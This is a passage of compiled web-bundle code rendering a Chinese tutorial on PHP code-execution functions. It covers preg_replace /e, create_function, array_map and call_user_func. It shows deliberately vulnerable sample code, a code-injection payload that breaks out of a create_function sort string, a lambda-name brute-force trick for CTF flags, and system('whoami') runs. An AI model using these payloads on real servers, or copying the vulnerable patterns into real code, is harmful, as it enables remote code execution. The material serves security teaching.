",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'{${phpinfo()}}'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,"访问页面，结果如下："),Object(p.b)("p",null,Object(p.b)("img",c({parentName:"p"},{src:"/images/20200818234802.png",alt:null}))),Object(p.b)("p",null,"我们看到成功执行了代码。"),Object(p.b)("p",null,"但是这里我是直接将这段代码写到了文件里，那么如果我们是通过GET传参得到参数，这里针对上面那个案例就需要注意一点，在通过GET传参时，",Object(p.b)("inlineCode",{parentName:"p"},".*"),"会被替换为",Object(p.b)("inlineCode",{parentName:"p"},"_*"),"导致我们要的正则被替换了，达不到我们的效果，所以这里可用使用一些其他的正则表达式来达到目的，比如通过GET传参时我们的参数可以传入",Object(p.b)("inlineCode",{parentName:"p"},"\\S*"),"从而达到同样目的。所以以后再遇到这个函数的时候，要留个心眼了。不过，这里要补充一点，就是",Object(p.b)("inlineCode",{parentName:"p"},"preg_replace()"),"函数在PHP 7 后便不再支持，使用",Object(p.b)("inlineCode",{parentName:"p"},"preg_replace_callback()"),"进行替换了，取消了不安全的",Object(p.b)("inlineCode",{parentName:"p"},"\\e"),"模式。"),Object(p.b)("h3",{className:"__internal",id:"create_function"},"create_function()",Object(p.b)("a",c({parentName:"h3"},{href:"#create_function","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null," ",Object(p.b)("inlineCode",{parentName:"p"},"create_function()"),"用来创建一个匿名函数"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"create_function"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"(")," string ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$args"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," string ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$code"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),":")," string"))),Object(p.b)("h4",{className:"__internal",id:"参数-1"},"参数",Object(p.b)("a",c({parentName:"h4"},{href:"#%E5%8F%82%E6%95%B0-1","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("ul",null,Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"string $args\t声明的函数变量部分"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"string $code\t要执行的代码\t")),Object(p.b)("h4",{className:"__internal",id:"返回值-1"},"返回值",Object(p.b)("a",c({parentName:"h4"},{href:"#%E8%BF%94%E5%9B%9E%E5%80%BC-1","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"返回唯一的函数名称作为字符串或者返回FALSE错误"),Object(p.b)("p",null,Object(p.b)("inlineCode",{parentName:"p"},"create_function()"),"函数在内部执行",Object(p.b)("inlineCode",{parentName:"p"},"eval()"),"函数，所以我们就可以利用这一点，来执行代码。当然正因为存在安全问题，所以在PHP 7.2 之后的版本中已经废弃了",Object(p.b)("inlineCode",{parentName:"p"},"create_function()"),"函数，使用匿名函数来代替。所以这里为了演示这个函数，我采用的是PHP 5 的环境。那么这个函数到底怎么用呢？"),Object(p.b)("p",null,"那么来看我写的一个简单的案例"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$onefunc")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"create_function"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'$a'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'return system($a);'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$onefunc"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),"whoami",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),"\n    \n执行结果——>desktop-m61j5j6\\admin"))),Object(p.b)("p",null,"我们看到使用此函数为我们相当于创造了一个匿名的函数，给它赋以相应的变量，就执行了我们要执行的代码。"),Object(p.b)("p",null,"那么接下来我们来看一个简单的案例"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"error_reporting"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"0"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$sort_by")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_GET"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'sort_by'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$sorter")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'strnatcasecmp'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$databases"),Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"array"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'1234'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'4321'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$sort_function")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"' return 1 * '")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),".")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$sorter")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),".")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'($a[\"'")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),".")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$sort_by")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),".")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'\"], $b[\"'")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),".")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$sort_by")," ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),".")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'\"]);'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"usort"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$databases"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"create_function"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'$a, $b'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$sort_function"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,"这个主要功能就是实现排序，这段代码就调用了",Object(p.b)("inlineCode",{parentName:"p"},"create_function()"),"函数，那么我们能否利用这个函数执行我们想要执行的代码呢？"),Object(p.b)("p",null,"当然可以，我们只需要在传参时将前面的符号闭合，然后输入我们想要执行的代码即可。"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),"payload",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"="),Object(p.b)("span",c({parentName:"code"},{className:"token single-quoted-string string"}),"'\"]);}phpinfo();/*\n执行payload前：$sort_function = '")," ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"return")," ",Object(p.b)("span",c({parentName:"code"},{className:"token number"}),"1")," ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"*")," ",Object(p.b)("span",c({parentName:"code"},{className:"token single-quoted-string string"}),"' . $sorter . '"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$a"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"code"},{className:"token double-quoted-string string"}),"\"' . ",Object(p.b)("span",c({parentName:"span"},{className:"token interpolation"}),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$sort_by"))," . '\""),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$b"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"code"},{className:"token double-quoted-string string"}),"\"' . ",Object(p.b)("span",c({parentName:"span"},{className:"token interpolation"}),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$sort_by"))," . '\""),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),Object(p.b)("span",c({parentName:"code"},{className:"token single-quoted-string string"}),"';\n执行payloda后：$sort_function = '")," ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"return")," ",Object(p.b)("span",c({parentName:"code"},{className:"token number"}),"1")," ",Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"*")," ",Object(p.b)("span",c({parentName:"code"},{className:"token single-quoted-string string"}),"' . $sorter . '"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$a"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"code"},{className:"token double-quoted-string string"}),"\"' . ",Object(p.b)("span",c({parentName:"span"},{className:"token interpolation"}),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$sort_by"))," '\""),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"}"),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"phpinfo"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),";"),Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"/"),Object(p.b)("span",c({parentName:"code"},{className:"token operator"}),"*")))),Object(p.b)("p",null,"看到这里，你可能会有稍微疑惑，就是你闭合就闭合吧，为什么后面多了个",Object(p.b)("inlineCode",{parentName:"p"},";}"),"，不知道你是否想到了这一点？"),Object(p.b)("p",null,"那么我就来分析一下这个，上面的那段执行代码，实际上就是一个匿名函数的创建，既然是一个函数，注意是一个函数，那么你觉得有没有花括号呢？看我如下代码"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token prolog"}),"<?php\n    //未闭合之前\n    function sort($a,$b){\n    ' return 1 * ' . $sorter . '($a[\"' . $sort_by . '\"], $b[\"' . $sort_by . '\"]);';\n\t}\n\t//闭合之后\n\tfunction sort($a,$b){\n        ' return 1 * ' . $sorter . '($a[\"' . $sort_by '\"]);\n    }\n        phpinfo();/*\n    }\n?>")))),Object(p.b)("p",null,"可以看到，我们借用了匿名函数的位置，插入了我们要执行的代码，然后等这个匿名函数被",Object(p.b)("inlineCode",{parentName:"p"},"create_function"),"当作",Object(p.b)("inlineCode",{parentName:"p"},"$code"),"执行的时候，是不是代码就被执行了。"),Object(p.b)("p",null,"结果："),Object(p.b)("p",null,Object(p.b)("img",c({parentName:"p"},{src:"/images/20200819181726.png",alt:null}))),Object(p.b)("p",null,"那么",Object(p.b)("inlineCode",{parentName:"p"},"creat_function"),"函数还有别的用法吗？我们将上面一个案例简单的修改一下，代码如下："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$onefunc")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"create_function"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'""'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token double-quoted-string string"}),'"die(`cat flag.php`)"'),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$_GET"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'func_name'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n\t",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"die"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>"))))),Object(p.b)("p",null,"代码简单的来看，我们只需要执行",Object(p.b)("inlineCode",{parentName:"p"},"$onefunc"),"就能得到flag，但是我们不知道这个函数的名称。如果在不知道函数名称的情况下执行函数呢？这里就用到了",Object(p.b)("inlineCode",{parentName:"p"},"creat_function"),"函数的一个漏洞。这个函数在creat之后会自动生成一个函数名为",Object(p.b)("inlineCode",{parentName:"p"},"%00lambda_%d"),"的匿名函数。",Object(p.b)("inlineCode",{parentName:"p"},"%d"),"的值是一直递增的，会一直递增到最大长度直到结束。所以这里可以通过多进程或者多线程访问，从而看到flag。"),Object(p.b)("p",null,"所以，以后再代码中如果看到调用",Object(p.b)("inlineCode",{parentName:"p"},"create_function()"),"要小心一点，但是如果是CTF题目的话，不会这么直接就吧这个函数暴露给你，它可能会用到拼接或者替换来构造这个函数。最后再强调一下，",Object(p.b)("inlineCode",{parentName:"p"},"create_function"),"函数在PHP 7.2 版本之后就已经被废弃了。"),Object(p.b)("h3",{className:"__internal",id:"array_map"},"array_map()",Object(p.b)("a",c({parentName:"h3"},{href:"#array_map","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,Object(p.b)("inlineCode",{parentName:"p"},"array_map()"),"为数组的每个元素应用回调函数"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"array_map"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"(")," ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"callable")," ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$callback"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"array")," ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$array1"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"array")," $",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"]")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),")")," ",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),":")," ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"array")))),Object(p.b)("p",null,Object(p.b)("strong",{parentName:"p"},"array_map()"),"：返回数组，是为 ",Object(p.b)("inlineCode",{parentName:"p"},"array1")," 每个元素应用 ",Object(p.b)("inlineCode",{parentName:"p"},"callback"),"函数之后的数组。",Object(p.b)("inlineCode",{parentName:"p"},"callback")," 函数形参的数量和传给",Object(p.b)("inlineCode",{parentName:"p"},"array_map()")," 数组数量，两者必须一样。"),Object(p.b)("h4",{className:"__internal",id:"参数-2"},"参数",Object(p.b)("a",c({parentName:"h4"},{href:"#%E5%8F%82%E6%95%B0-2","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("ul",null,Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"callback：回调函数，应用到每个数组里的每个元素。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"array1：数组，遍历运行",Object(p.b)("inlineCode",{parentName:"li"},"callback"),"函数。"),Object(p.b)("li",c({parentName:"ul"},{className:"__internal"}),"...：数组列表，每个都遍历运行",Object(p.b)("inlineCode",{parentName:"li"},"callback"),"函数。")),Object(p.b)("h4",{className:"__internal",id:"返回值-2"},"返回值",Object(p.b)("a",c({parentName:"h4"},{href:"#%E8%BF%94%E5%9B%9E%E5%80%BC-2","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,"返回数组，包含",Object(p.b)("inlineCode",{parentName:"p"},"callback"),"函数处理之后",Object(p.b)("inlineCode",{parentName:"p"},"array1"),"的所有元素。"),Object(p.b)("p",null,"说了这么多官方的函数解释，那么这个函数到底如何使用呢？简而言之，这个函数的作用可以这么直白的解释一下。你本来有一个数组，然后我通过",Object(p.b)("inlineCode",{parentName:"p"},"array_map"),"函数将你这个数组当作参数传入，然后返回一个新的数组。见下图。"),Object(p.b)("p",null,Object(p.b)("img",c({parentName:"p"},{src:"/images/20200819211747.png",alt:null}))),Object(p.b)("p",null,"代码示例："),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$old_array")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"array"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"1"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"2"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"3"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"4"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),",")," ",Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"5"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"function")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"func"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$arg"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"{"),"\n        ",Object(p.b)("span",c({parentName:"span"},{className:"token keyword"}),"return")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$arg")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"*")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$arg"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"}"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$new_array")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"array_map"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'func'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$old_array"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"var_dump"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$new_array"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),"\n    \n    \n执行结果——>\narray(5) {\n  [0]=>\n  int(1)\n  [1]=>\n  int(4)\n  [2]=>\n  int(9)\n  [3]=>\n  int(16)\n  [4]=>\n  int(25)\n}"))),Object(p.b)("p",null,"通过上述代码，我们大概知道这个函数就是调用回调函数（用户自定义的函数）来实现对现有数组的操作，从而得到一个新的数组。"),Object(p.b)("p",null,"那么功能我知道了，可是这个和代码执行有什么关系呢？如何能够利用这个函数执行代码呢？且看下面所示代码。"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token php language-php"}),Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"<?php"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$func")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'system'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$cmd")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token single-quoted-string string"}),"'whoami'"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$old_array"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"span"},{className:"token number"}),"0"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"]")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$cmd"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$new_array")," ",Object(p.b)("span",c({parentName:"span"},{className:"token operator"}),"=")," ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"array_map"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$func"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),","),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$old_array"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n    ",Object(p.b)("span",c({parentName:"span"},{className:"token function"}),"var_dump"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),"("),Object(p.b)("span",c({parentName:"span"},{className:"token variable"}),"$new_array"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),")"),Object(p.b)("span",c({parentName:"span"},{className:"token punctuation"}),";"),"\n",Object(p.b)("span",c({parentName:"span"},{className:"token delimiter important"}),"?>")),'\n    \n    \n执行结果——>\ndesktop-m61j5j6\\admin\narray(1) {\n  [0]=>\n  string(21) "desktop-m61j5j6\\admin"\n}'))),Object(p.b)("p",null,"这段代码就是，通过",Object(p.b)("inlineCode",{parentName:"p"},"array_map()"),"这个函数，来调用用户自定义的函数，而用户这里的回调函数其实就是",Object(p.b)("inlineCode",{parentName:"p"},"system"),"函数，那么就相当于我们用",Object(p.b)("inlineCode",{parentName:"p"},"system"),"函数来对旧数组进行操作，得到新的数组，那么这个新的数组的结果就是我们想要的命令执行的结果了。"),Object(p.b)("h3",{className:"__internal",id:"call_user_func"},"call_user_func()",Object(p.b)("a",c({parentName:"h3"},{href:"#call_user_func","aria-hidden":!0,className:"anchor"}),"#")),Object(p.b)("p",null,Object(p.b)("inlineCode",{parentName:"p"},"call_user_func()"),"是把第一个参数作为回调函数调用"),Object(p.b)("div",{className:"rcpress-highlight","data-language":"php"},Object(p.b)("pre",c({parentName:"div"},{className:"language-php"}),Object(p.b)("code",c({parentName:"pre"},{className:"language-php"}),Object(p.b)("span",c({parentName:"code"},{className:"token function"}),"call_user_func"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"(")," ",Object(p.b)("span",c({parentName:"code"},{className:"token keyword"}),"callable")," ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$callback"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," mixed ",Object(p.b)("span",c({parentName:"code"},{className:"token variable"}),"$parameter"),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"["),Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),",")," mixed $",Object(p.b)("span",c({parentName:"code"},{className:"token punctuation"}),"."),Object(p.b)("span",c({parentName:"code"},{className:"token 